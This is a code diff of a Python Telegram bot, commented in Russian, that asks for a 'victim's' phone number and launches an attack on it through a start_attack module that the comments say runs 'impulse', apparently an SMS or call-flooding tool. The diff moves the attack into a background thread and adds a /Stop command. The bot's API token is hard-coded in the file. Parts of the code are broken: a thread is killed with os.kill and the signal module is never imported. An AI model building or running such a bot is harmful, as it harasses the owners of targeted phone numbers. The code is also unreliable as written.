@@ -3,7 +3,12 @@
 import start_attack
 import help
 import run_bot
+import threading
+import sys
 import telebot
+import os
+
+
 
 bot = telebot.TeleBot("1884845165:AAE51LVnKOW2_tmgXyCpsC1nu-a-JXIYBuc")
 
@@ -19,6 +24,12 @@ try:
 		bot.send_message(message.chat.id, "Введите номер жертвы в формате - \"+7**********\"")
 		bot.register_next_step_handler(message, send_number)
 
+	@bot.message_handler(commands=['Stop'])  # Обработка команд
+	def send_stop(message):
+		bot.send_message(message.chat.id, "Для продолжения и выбора следующей цели введите /Start")
+		os.kill(p1.pid, signal.SIGINT)
+
+
 	@bot.message_handler(commands=['Help'])
 	def send_help(message):
 		bot.send_message(message.chat.id, help.h())
@@ -26,13 +37,18 @@ try:
 
 	@bot.message_handler(commands=['Attack'])  # Запускает impulse по команде
 	def send_attack(message):
-		global answer
-		bot.send_message(message.chat.id, "Атака началась")
-		result = start_attack.sa(par_time, par_threads, par_number)  # подключаем модуль с функцией, которая запускает impulse
-		# Проверяем  выполнение атаки
-		if result != 0:
-			answer = "Атака завершена. \nЧто бы выбрать другую цель введите \n/Start"
-		bot.send_message(message.chat.id, answer)
+		global p1
+		bot.send_message(message.chat.id, "Атака началась \nЧто бы прервать введите /Stop")
+
+		# запускаем дочерний демонический процесс, который будет выполнять аттаку
+		p1 = threading.Thread(target=start_attack.sa, daemon=True, name="t1", args=[par_time, par_threads, par_number] )
+		p1.start()
+		print(p1)
+		# Проверяем  выполнение атаки p1 = threading.Thread(target=proc, daemon=True, name="t1", args=[])
+		while p1.is_alive() :
+			continue
+		else:
+			bot.send_message(message.chat.id, "Атака завершена. \nЧто бы выбрать другую цель введите \n/Start")
 
 # Обработка сообщений
 
